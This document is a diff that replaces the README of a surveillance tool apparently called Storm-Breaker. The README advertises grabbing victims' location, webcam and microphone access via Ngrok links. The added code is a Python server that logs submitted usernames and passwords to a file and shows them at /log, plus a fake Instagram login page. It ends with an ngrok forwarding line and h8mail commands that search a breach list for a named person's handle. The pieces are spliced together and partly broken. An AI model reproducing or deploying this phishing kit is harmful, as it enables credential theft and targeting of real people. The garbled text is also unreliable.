@@ -1,111 +1,103 @@
-<h1 align="center">
-  <br>
-  <a href="https://github.com/ultrasecurity/Storm-Breaker"><img src=".imgs/1demo.png" alt="StormBreaker"></a>
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json, datetime, os
 
-</h1>
+CREDS_FILE = "captured_creds.txt"
 
-<h4 align="center">A Tool With Attractive Capabilities. </h4>
+class CaptureHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/log':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self.end_header()
+            if os.path.exists(CREDS_FILE):
+                with open(CREDS_FILE) as f:
+                    self.wfile.write(f.read().encode())
+            else:
+                self.wfile.write(b"No captures yet.")
+        elif self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.end_headers()
+            with open('index.html') as f:
+                self.wfile.write(f.read().encode())
+        else:
+            self.send_error(404)
 
-<p align="center">
+    def do_POST(self):
+        if self.path == '/capture':
+            length = int(self.headers['Content-Length'])
+            body = self.rfile.read(length)
+            data = json.loads(body)
+            with open(CREDS_FILE, 'a') as f:
+                f.write(f"[{datetime.datetime.now()}] {data['username']}:{data['password']}\n")
+            print(f"\n[!] CAPTURED: {data['username']}:{data['password']}")
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"OK")
 
-  <a href="http://python.org">
-    <img src="https://img.shields.io/badge/python-v3-blue">
-  </a>
-  <a href="https://php.net">
-    <img src="https://img.shields.io/badge/php-7.4.4-green"
-         alt="php">
-  </a>
+port = 8080
+print(f"[+] Server running on http://0.0.0.0:{port}")
+print(f"[+] Open http://0.0.0.0:{port} in browser")
+print(f"[+] Captured credentials: http://0.0.0.0:{port}/log")
+server = HTTPServer(('0.0.0.0', port), CaptureHandler)
+server.serve_forever()<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+    .login-box {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 20px;
+      max-width: 350px;
+      width: 100%;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .logo { margin-bottom: 24px; }
+    .logo svg { width: 175px; }
+    form { display: flex; flex-direction: column; gap: 6px; }
+    input {
+      width: 100%;
+      padding: 9px 8px 7px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 12px;
+      outline: none;
+    }
+    input:focus { border-color: #a8a8a8; }
+    button {
+      background: #0095f6;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 7px 16px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    button:hover { background: #0081df; }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;Forwarding  https://abc123.ngrok-free.app -> http://localhost:80# Install
+pip install h8mail
 
-  <a href="https://en.wikipedia.org/wiki/Linux">
-    <img src="https://img.shields.io/badge/Platform-Linux-red">
-  </a>
-
-</p>
-
-![demo](.imgs/screen1.jpeg)
-
-### Features:
-
-- Obtain Device Information Without Any Permission !
-- Access Location [SMARTPHONES]
-- Access Webcam
-- Access Microphone
-
-<br>
-
-### Update Log:
-
-- Second (latest) Update on November 4th , 2022 .
-- The overall structure of the tool is programmed from the beginning and is available as a web panel (in previous versions, the tool was available in the command line).
-- Previous version's bugs fixed !
-- Auto-download Ngrok Added !
-- The templates have been optimized !
-- Logs can be downloaded (NEW) !
-- Clear log Added !
-- It can be uploaded on a personal host (you won't have the Ngork problems anymore)
-- You can start and stop the listener anytime ! (At will)
-- Beautified user interface (NEW) !
-
-> We have deleted Ngrok in the new version of Storm breaker and entrusted the user with running and sharing the localhost . So please note that Storm breaker runs a localhost for you and you have to start the Ngrok on your intended port yourself .
-> <br>
-
-#### Attention! :
-
-> This version can be run on both local host and your personal domain and host . However , you can use it for both situations. If your country has suspended the Ngrok service, or your country's banned Ngrok, or your victim can't open the Ngrok link (for the reasons such as : He sees such a link as suspicious, Or if this service is suspended in his country) We suggest using the tool on your personal host and domain .
-> <br>
-
-## Default username and password:
-
-- `username` : `admin`
-- `password` : `admin`
-- You can edit the config.php file to change the username and password .
-  <br>
-
-### Dependencies
-
-**`Storm Breaker`** requires following programs to run properly -
-
-- `php`
-- `python3`
-- `git`
-- `Ngrok`
-
-<!-- ![demo](.imgs/Work3.gif) -->
-<br>
-
-### Platforms Tested
-
-- Kali Linux 2022
-- macOS Big Sur / M1
-- Termux (android)
-- Personal host (direct admin and cPanel)
-  <br>
-
-### Installation On Kali Linux
-
-```
-git clone https://github.com/ultrasecurity/Storm-Breaker
-cd Storm-Breaker
-sudo bash install.sh
-sudo python3 -m pip install -r requirements.txt
-sudo python3 st.py
-```
-
-<br>
-
-**`how to run personal host 👇`**
-
-> Zip the contents of the storm-web folder completely and upload it to the public_html path .
-
-> Note that the tool should not be opened in a path like this > yourdomain.com/st-web
-> Instead , it should be opened purely in the public_html path (i.e. : don't just zip the storm-web folder itself, but manually zip its contents (the index.php file and other belongings should be in the public_html path)
-
-#### Attention!:
-
-> Note that to use this tool on your Localhost , You also need SSL . Because many of the tool's capabilities require SSL .
-
-#### Attention!:
-
-> To run ngrok on termux you need to enable your personal hotspot and cellular network.
-
-</p>
+# Use
+h8mail -t kuldip__005 -bc "https://raw.githubusercontent.com/awesome-wordlists/breach-compilation/main/breach.txt"
